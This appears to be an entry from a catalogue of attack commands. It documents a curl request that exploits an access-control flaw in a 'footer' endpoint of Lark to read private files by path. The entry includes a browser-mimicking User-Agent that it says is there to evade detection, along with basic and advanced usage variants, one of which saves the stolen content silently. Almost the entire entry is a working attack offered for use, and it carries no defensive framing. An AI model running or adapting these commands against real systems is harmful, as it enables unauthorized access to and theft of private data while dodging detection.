---
id: cmd-uuid-001
data: >-
  curl -X GET "https://lark.example.com/footer?file=/path/to/private/file.txt"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
tags:
  - web-exploit
  - access-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:44.456Z'
verified: false
validated: true
submitted: true
---
# curl-footer-access

## Command

```bash
curl -X GET "https://lark.example.com/footer?file=/path/to/private/file.txt" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

## Description

This curl command exploits the improper access control in Lark's footer feature by requesting a private file via the vulnerable endpoint. It simulates a browser request to evade basic detection and retrieves unauthorized file contents.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `"https://lark.example.com/footer?file=/path/to/private/file.txt"` | The target URL with the private file path parameter | Yes |
| `-H "User-Agent: ..."` | Sets a browser-like User-Agent header to mimic legitimate traffic | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://lark.example.com/footer?file=/private/secret.txt"
```

### Advanced Usage

```bash
curl -X GET "https://lark.example.com/footer?file=/private/docs/config.json" -H "User-Agent: Mozilla/5.0" -o output.txt --silent
```

This saves the output to a file silently.

## Expected Output

On success, the command outputs the raw contents of the private file, such as text or JSON data. Example:
```
This is sensitive private file content...
```
No auth errors; HTTP status 200 implied.

## Related

- [[Related Procedure: Exploit-Lark-Footer-Access-Control-Bypass]]
